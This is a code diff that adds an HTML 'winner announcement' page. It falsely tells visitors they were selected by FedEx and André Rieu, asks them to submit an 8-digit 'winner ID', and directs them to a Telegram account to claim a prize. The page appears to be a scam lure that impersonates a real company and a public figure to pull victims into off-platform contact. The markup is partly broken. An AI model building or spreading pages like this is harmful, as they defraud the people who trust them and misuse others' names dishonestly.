@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Winner Announcement</title>
+<link rel="stylesheet" href="style.css">
+
+</head>
+<body>
+  <h1>Welcome dear winner. You have been selected by FedEx and André Rieu.</h1>
+
+  <div id="photo-section">
+    <figure>
+      <img src="/storage/emulated/0/DCIM/100PINT/Épingles/914b9727b02052c44210ca44561c8d29.jpg" alt="Winner Photo">
+      <figcaption>Here are Mrs. Kurch and her husband Tamar, our lucky winners from yesterday... If you were selected, you are welcome to join us. </figcaption>
+    </figure>
+  </div>
+
+  <div id="message">You are invited to confirm your unique winner ID below.</div>
+
+  <div id="inputSection">
+    <input type="text" id="numberInput" placeholder="Enter 8-digit number" maxlength="8" />
+    <button onclick="verifyNumber()">Submit</button>
+  </div>
+
+  <div id="result"></div>
+
+  <button id="downloadBtn" onclick="downloadImage()">Download Image</button>
+
+   
+   
+   <!-- ... (tout l'en-tête reste identique) ... -->
+
+  <div id="contacts">
+    <p>To receive your prize, please contact the transport agents via Telegram.</p>
+    
+    
+    <button class="contact-btn telegram" onclick="window.location.href='https://t.me/FedExDailyHiv'">Telegram</button>
+    
+    </a>
+  </div>
+
+  
+
+<!-- ... (le reste du script reste inchangé) ... -->
+
+   
+   
+   
+  </div>
+
+  <div class="good-luck">Good luck dear winner</div>
+<script src="script.js"></script>
+
+  
+</body>
+</html>
